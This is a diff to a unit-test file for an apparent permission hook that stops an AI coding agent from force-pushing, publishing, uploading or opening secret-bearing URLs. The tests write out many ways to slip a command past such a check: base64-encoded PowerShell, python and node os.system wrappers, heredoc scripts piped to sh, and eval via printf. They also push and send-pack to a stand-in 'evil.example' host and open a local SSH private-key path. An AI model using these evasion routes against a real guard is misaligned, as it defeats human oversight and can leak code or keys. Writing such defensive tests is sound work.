@@ -105,10 +105,90 @@ class Generic(Case):
         self.blocked("git push --force origin main", "force-push-main", tool="PowerShell")
 
     def test_force_push_allowed(self):
-        for cmd in ["git push origin main", "git push --force-with-lease origin feature/x", "git push -f origin feature",
+        for cmd in ["git push --force-with-lease origin feature/x", "git push -f origin feature",
                     'git commit -m "never git push --force origin main"', "grep -rn 'git push --force' docs/",
                     "git push origin main-lane-x", "git push --all origin"]:
             self.allowed(cmd)
+
+    def test_push_prose_is_data(self):
+        for cmd in ['git commit -m "fix: git push retry"', 'echo "git push"', 'grep -rn "git push" docs/',
+                    "cat <<EOF > notes.md\nrun git push --force origin main later\nEOF",
+                    'echo "git push --force origin main"', "printf '%s' 'git push origin main'"]:
+            self.allowed(cmd)
+
+    def test_executed_strings_are_judged(self):
+        import base64
+        enc = lambda t: base64.b64encode(t.encode("utf-16-le")).decode()  # noqa: E731
+        force = "git push --force origin main"
+        for cmd in [f'python -c "import os; os.system(\'{force}\')"', f"py -3 -c \"import subprocess; subprocess.run('{force}')\"",
+                    f"node -e \"require('child_process').execSync('{force}')\"", f"deno eval \"Deno.run('{force}')\"",
+                    f"powershell -EncodedCommand {enc(force)}", f"pwsh -enc {enc(force)}",
+                    f"echo '{force}' > x.sh; sh x.sh", f"echo '{force}' | sh", f"cat <<EOF > run.sh\n{force}\nEOF\nbash run.sh",
+                    f"printf '{force}' | tee y.sh; bash y.sh", f"Set-Content x.ps1 '{force}'; & ./x.ps1"]:
+            self.blocked(cmd, "force-push-main", tool="PowerShell" if cmd.startswith("Set-Content") else "Bash")
+        self.blocked('python -c "import os; os.system(\'git push origin main\')"', "push-default-branch")
+        self.blocked("pwsh -EncodedCommand !!!notbase64 ; git status", "encoded-command")
+        for cmd in [f'git commit -m "fix: {force}"', f'git commit --message="{force}"', f'git tag -a v1 -m "{force}"',
+                    f'echo "{force}"', f'grep -rn "{force}" docs/', f'grep -rn "{force}" docs/ > out.txt',
+                    f"cat <<EOF > docs/notes.md\n{force}\nEOF", f'gh pr create --title "x" --body "never {force}"',
+                    f'gh issue create -t "{force}" -b "x"', f"python -c \"print('hello')\""]:
+            self.allowed(cmd)
+
+    def test_encoded_commands_fail_closed(self):
+        import base64
+        force = "git push --force origin main"
+        odd = base64.b64encode(force.encode("utf-16-le") + b"\x00").decode()     # odd length decodes like .NET
+        for cmd in [f"pwsh -enc {odd}", f"powershell /enc {base64.b64encode(force.encode('utf-16-le')).decode()}",
+                    f"pwsh --encodedcommand {base64.b64encode(force.encode('utf-16-le')).decode()}",
+                    f"pwsh -NoProfile -ExecutionPolicy Bypass -ec {base64.b64encode(force.encode('utf-16-le')).decode()}",
+                    f"pwsh -EncodedC:{base64.b64encode(force.encode('utf-16-le')).decode()}"]:
+            self.blocked(cmd, "force-push-main")
+        for cmd in ["pwsh -enc !!!notbase64", "powershell -EncodedCommand", "pwsh /e ???", "pwsh -NoProfile -en %%"]:
+            self.blocked(cmd, "encoded-command")                 # undecodable: denied, git or not
+        self.allowed("pwsh -NoProfile -Command Get-Date")
+        self.allowed("pwsh -enc " + base64.b64encode("Get-Date".encode("utf-16-le")).decode())
+        enc = base64.b64encode(force.encode("utf-16-le")).decode()
+        for cmd in ['git commit -m "docs: explain pwsh -ec usage"', "echo 'use pwsh -e $B to run it'",
+                    'grep -rn "pwsh -enc" docs/', f'gh pr create --title "x" --body "never pwsh -ec {enc}"']:
+            self.allowed(cmd)                                    # prose that names an encoded command runs nothing
+        self.blocked(f'bash -c "pwsh -ec {enc}"', "force-push-main")
+        self.blocked("echo 'pwsh -ec !!!notbase64' | bash", "encoded-command")
+
+    def test_rg_pre_and_printf_v_are_not_prose(self):
+        force = "git push --force origin main"
+        self.blocked(f'rg --pre ./x.sh "{force}" .', "force-push-main")
+        self.blocked(f"printf -v c '{force}'; eval \"$c\"", "force-push-main")
+        self.allowed(f'rg -n "{force}" docs/')
+        self.allowed(f"printf '%s\\n' '{force}'")
+
+    def test_push_to_a_default_branch(self):
+        for cmd in ["git push origin main", "git push origin feature/x:main", "git push origin HEAD:refs/heads/main",
+                    "git push origin feat:master", "git push origin x:HEAD", "git push -u origin feature:refs/heads/master",
+                    'bash -c "git push origin main"', "sh -c 'git push origin feature/x:main'",
+                    'pwsh -Command "git push origin main"', 'cmd /c "git push origin main"', 'eval "git push origin main"']:
+            self.blocked(cmd, "push-default-branch")
+        for cmd in ["git push origin feature/x", "git push origin --delete feature/old", "git push origin main-lane-x",
+                    "git push --tags origin"]:
+            self.allowed(cmd)
+
+    @unittest.skipUnless(HAS_GIT, "git not installed")
+    def test_push_to_a_default_branch_uses_the_repo(self):
+        self.blocked("git push", "push-default-branch", cwd=git_repo("main"))
+        self.blocked("git push -u origin HEAD", "push-default-branch", cwd=git_repo("master"))
+        self.allowed("git push -u origin HEAD", cwd=git_repo("feature"))
+        d = git_repo("feature", "https://git.example.com/acme/app.git")
+        git(d, "symbolic-ref", "refs/remotes/origin/HEAD", "refs/remotes/origin/develop")   # the remote's default
+        self.blocked("git push origin develop", "push-default-branch", cwd=d)
+
+    @unittest.skipUnless(os.name == "nt", "MSYS paths are a Windows concern")
+    def test_msys_paths(self):
+        for p in ["/c/Users/dev/a.txt", "/mnt/c/work/b.py", "/d/"]:
+            out = ev("Write", {"file_path": p, "content": "x"})
+            self.assertEqual(gid(out), "msys-path", p)
+            self.assertIn(":/", out["hookSpecificOutput"]["permissionDecisionReason"])
+        self.assertEqual(gid(ev("NotebookEdit", {"notebook_path": "/c/nb.ipynb", "new_source": "x"})), "msys-path")
+        self.assertNotEqual(gid(ev("Write", {"file_path": "C:/work/a.txt", "content": "x"})), "msys-path")
+        self.assertNotEqual(gid(ev("Write", {"file_path": "/srv/app/a.txt", "content": "x"})), "msys-path")
 
     @unittest.skipUnless(HAS_GIT, "git not installed")
     def test_bare_force_push_uses_current_branch(self):
@@ -241,6 +321,17 @@ class Generic(Case):
         self.assertEqual(gid(ev("Agent", {"subagent_type": "fork", "prompt": "x"})), "agent-fork")
         self.assertIsNone(ev("Agent", {"subagent_type": "general-purpose", "prompt": "x"}))
 
+    def test_browser_mcp_urls(self):
+        nav = "mcp__playwright__browser_navigate"
+        self.assertEqual(gid(ev(nav, {"url": f"https://app.example.com/?token={KEY}"})), "browser-url")
+        self.assertEqual(gid(ev("mcp__chrome-devtools__new_page", {"url": "https://user:example-pass@intranet.example.com/"})),
+                         "browser-url")
+        self.assertEqual(gid(ev("mcp__plugin_playwright_playwright__browser_navigate", {"url": "file:///D:/profile/.ssh/id_ed25519"})),
+                         "browser-url")
+        self.assertIsNone(ev(nav, {"url": "http://localhost:3000/settings"}))
+        self.assertIsNone(ev(nav, {"url": "file:///C:/work/site/index.html"}))
+        self.assertIsNone(ev("mcp__other__thing", {"url": f"https://x.example.com/?token={KEY}"}))
+
     def test_webfetch_secret(self):
         self.assertEqual(gid(ev("WebFetch", {"url": f"https://api.example.com/x?k={KEY}", "prompt": "x"})),
                          "webfetch-secret")
@@ -338,6 +429,58 @@ class Kit(Case):
 class Corporate(Case):
     CONF = ON
 
+    def asked(self, cmd, tool="Bash", cwd=None):
+        out = ev(tool, {"command": cmd}, cwd)
+        self.assertEqual(decision(out), "ask", f"expected an ask: {cmd!r} -> {out}")
+        self.assertEqual(gid(out), "publish-confirm", cmd)
+
+    def test_publishing_asks(self):
+        for cmd in ["npm publish", "yarn npm publish", "yarn publish", "pnpm publish --access public", "twine upload dist/*",
+                    "poetry publish", "cargo publish", "gem push x.gem", "dotnet nuget push x.nupkg",
+                    "docker push registry.example.com/team/app:1", "podman push app:1",
+                    "scp build.zip deploy@host.example.com:/srv/", "rsync -av dist/ host.example.com:/srv/app/",
+                    "rsync dist/ rsync://host.example.com/mod/", "sftp user@files.example.com",
+                    "aws s3 cp report.csv s3://team-bucket/reports/", "aws s3 sync out/ s3://team-bucket/out",
+                    "az storage blob upload --account-name acmestore -c c -f x.txt -n x.txt",
+                    "gsutil cp a.txt gs://bucket-x/", "gcloud storage cp a.txt gs://bucket-x/",
+                    "gcloud storage rsync out/ gs://bucket-x/out", "gcloud storage mv a.txt gs://bucket-x/",
+                    "gsutil rsync -r out/ gs://bucket-x/out", "aws s3 mv a.txt s3://team-bucket/",
+                    "docker image push registry.example.com/team/app:1",
+                    "gh pr merge 12 --admin --squash", "gh pr review 12 --approve", "gh pr comment 12 --body hi",
+                    "gh issue comment 3 --body hi"]:
+            self.asked(cmd)
+        self.asked("npm publish", tool="PowerShell")
+        for cmd in ['echo "npm publish"', "grep -rn 'docker push' docs/", "scp deploy@host.example.com:/srv/log.txt .",
+                    "aws s3 cp s3://team-bucket/x.csv .", "gh pr merge 12 --squash", "gh pr review 12 --comment -b ok",
+                    "npm pack", "docker build -t app ."]:
+            self.allowed(cmd)
+        set_allowlist(dict(ON, upload_hosts=["host.example.com", "team-bucket"]))
+        self.allowed("scp build.zip deploy@host.example.com:/srv/")
+        self.allowed("aws s3 cp report.csv s3://team-bucket/reports/")
+
+    @unittest.skipUnless(HAS_GIT, "git not installed")
+    def test_prose_and_nested_shell_pushes(self):
+        ok = git_repo("feature", "https://git.example.com/acme/app.git")
+        for cmd in ['git commit -m "fix: git push retry"', 'echo "git push"', 'grep -rn "git push" docs/',
+                    "cat <<EOF > notes.md\nthen git push it\nEOF"]:
+            self.allowed(cmd, cwd=ok)
+        for cmd in ['bash -c "git push origin feature"', "sh -c 'git push origin feature'", 'eval "git push origin feature"',
+                    'pwsh -Command "git push origin feature"', 'powershell -Command "git push origin feature"',
+                    'cmd /c "git push origin feature"', "bash <<EOF\ngit push origin feature\nEOF",
+                    'git commit -m "x" && git push origin feature', "cd sub && git push origin feature"]:
+            out = self.blocked(cmd, "remote-not-allowlisted", cwd=ok)
+            self.assertIn("no `cd` first, no `&&`", out["hookSpecificOutput"]["permissionDecisionReason"])
+        self.allowed("git push origin --delete feature/old", cwd=ok)
+        import base64
+        for cmd in ["python -c \"import os; os.system('git push origin feature')\"",
+                    "node -e \"require('child_process').execSync('git push origin feature')\"",
+                    "powershell -EncodedCommand " + base64.b64encode("git push origin feature".encode("utf-16-le")).decode(),
+                    "echo 'git push origin feature' > p.sh; sh p.sh"]:
+            self.blocked(cmd, "remote-not-allowlisted", cwd=ok)
+        with mock.patch.object(generic, "SHELL", tuple(f for f in generic.SHELL if f is not generic.push)):   # corporate alone
+            self.blocked("pwsh -enc !!!notbase64", "remote-not-allowlisted", cwd=ok)
+            self.allowed('git commit -m "docs: pwsh -ec $B"', cwd=ok)
+
     def test_default_is_on_with_no_hosts(self):
         set_allowlist(None)
         out = self.blocked("git push https://git.example.com/acme/app.git feature", "remote-not-allowlisted")
@@ -353,10 +496,10 @@ class Corporate(Case):
         self.allowed("GH_HOST=git.example.com gh repo create acme/app --private")
 
     def test_push_urls(self):
-        for cmd in ["git push https://github.com/someone/app.git main", "git push git@gitlab.com:someone/app.git",
+        for cmd in ["git push https://github.com/someone/app.git feature", "git push git@gitlab.com:someone/app.git",
                     "git remote add backup https://bitbucket.org/x/y.git", "git remote add -t main b https://x.example.org/y",
                     "git remote set-url origin git@github.com:x/y.git", "gh repo create acme/app --private",
-                    "gh repo fork acme/app", "git push ../backup.git main",       # local paths are refused too
+                    "gh repo fork acme/app", "git push ../backup.git feature",       # local paths are refused too
                     "git push ssh://git@code.git.example.com:2222/acme/app.git feature"]:   # exact hosts only
             self.blocked(cmd, "remote-not-allowlisted")
         for cmd in ["git push https://git.example.com/acme/app.git feature",
@@ -400,9 +543,9 @@ class Corporate(Case):
     def test_gist_and_release(self):
         for cmd in ["gh gist create notes.md", "gh release create v1 -R github.com/acme/app dist/app.zip",
                     "gh release upload v1 app.zip --repo acme/app"]:
-            self.blocked(cmd, "remote-not-allowlisted")
-        self.allowed("GH_HOST=git.example.com gh gist create notes.md")
-        self.allowed("gh release upload v1 app.zip", cwd=git_repo("main", "https://git.example.com/acme/app.git"))
+            self.blocked(cmd, "remote-not-allowlisted")             # deny outranks the publish ask
+        self.asked("GH_HOST=git.example.com gh gist create notes.md")
+        self.asked("gh release upload v1 app.zip", cwd=git_repo("main", "https://git.example.com/acme/app.git"))
         self.blocked("gh release create v1 app.zip", "remote-not-allowlisted",
                      cwd=git_repo("main", "https://github.com/someone/app.git"))
 
@@ -489,7 +632,7 @@ class Corporate(Case):
         for cmd in ["git p origin feature", "git q", "git sh", "git -c alias.x=push x origin feature",
                     "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.x GIT_CONFIG_VALUE_0=push git x",
                     "git config alias.x push && git x", "git send-pack https://evil.example/x feature",
-                    "git subtree push --prefix=lib https://evil.example/x main", "git lfs push origin feature",
+                    "git subtree push --prefix=lib https://evil.example/x feature", "git lfs push origin feature",
                     "git commit -m wip && git push origin feature"]:
             self.blocked(cmd, "remote-not-allowlisted", cwd=ok)
         self.allowed("git st", cwd=ok)                       # an alias to a builtin that is not a push
